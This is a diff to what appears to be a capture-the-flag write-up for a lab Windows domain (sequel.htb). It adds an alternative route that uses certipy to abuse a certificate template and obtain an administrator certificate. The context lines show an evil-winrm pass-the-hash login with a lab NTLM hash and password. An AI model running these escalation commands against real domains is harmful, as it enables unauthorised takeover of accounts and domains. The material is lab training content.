@@ -104,7 +104,7 @@ evil-winrm -i 10.10.11.202 -u administrator -H a52f78e4c751e5f5e17e1e9f3e58f4ee
 ```
 ![image](https://github.com/user-attachments/assets/9a786f1d-7388-4793-9eb6-318c435f64df)
 
-# OR
+# OR1
 ```
 git clone https://github.com/ly4k/Certipy.git
 python3 setup.py install
@@ -129,3 +129,10 @@ certipy auth -pfx administrator_dc.pfx -dc-ip 10.10.11.202
 evil-winrm -i 10.10.11.202 -u administrator -H a52f78e4c751e5f5e17e1e9f3e58f4ee
 ```
 ![image](https://github.com/user-attachments/assets/2f8c2ee8-2536-4e1f-87dc-2628f7ee26e2)
+
+# OR2
+```
+certipy req -u ryan.cooper -p NuclearMosquito3 -target 10.10.11.202 -upn administrator@sequel.htb -ca sequel-dc-ca -template UserAuthentication
+certipy auth -pfx administrator.pfx -dc-ip 10.10.11.202
+```
+![image](https://github.com/user-attachments/assets/165e8554-4d93-4dca-8b36-1b5cb4191337)
